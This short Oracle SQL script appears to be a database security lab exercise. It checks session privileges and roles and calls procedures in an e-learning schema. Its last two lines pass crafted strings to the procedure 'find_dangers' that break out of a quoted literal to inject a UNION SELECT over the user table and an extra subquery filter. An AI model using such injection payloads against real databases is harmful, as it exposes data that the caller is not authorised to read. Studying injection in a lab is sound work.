select sys_context('app_ctx', 'attr_hour') from dual;

select * from elearn_app_admin_sla.solves;

execute elearn_app_admin_sla.proc_marking(1,2,3,10);

select * from session_privs;
select * from session_roles;
select * from user_tab_privs;
select * from user_col_privs;

execute elearn_app_admin_sla.find_dangers('2021');
execute elearn_app_admin_sla.find_dangers('01-2022');

execute elearn_app_admin_sla.find_dangers('01-2022%'' union select 99 as id_homework, id as id_stud, year_in, 99 as grade, 99 as id_corrector from user_ where username like ''' );

execute elearn_app_admin_sla.find_dangers('2021%'' and student_id in (select id from student where resume_studies = 1) and ''AAA'' like ''');